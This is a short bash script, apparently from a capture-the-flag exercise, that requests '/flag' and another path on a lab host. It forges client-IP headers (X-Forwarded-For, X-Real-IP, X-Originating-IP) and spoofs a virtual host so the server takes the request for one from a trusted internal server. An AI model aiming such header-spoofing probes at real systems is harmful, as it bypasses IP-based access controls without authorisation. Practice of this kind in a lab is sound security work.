#!/bin/bash
SS_IP="77.74.147.54"

for path in "/next_chars?char=s" "/flag"; do
  echo "=== GET $path med X-Forwarded-For: $SS_IP ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "X-Forwarded-For: $SS_IP"
  echo ""; echo "---"

  echo "=== GET $path med X-Real-IP: $SS_IP ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "X-Real-IP: $SS_IP"
  echo ""; echo "---"

  echo "=== GET $path med X-Originating-IP: $SS_IP ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "X-Originating-IP: $SS_IP"
  echo ""; echo "---"

  echo "=== GET $path med Host: secret-server.hkn (vhost-spoof) ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "Host: secret-server.hkn"
  echo ""; echo "---"
done
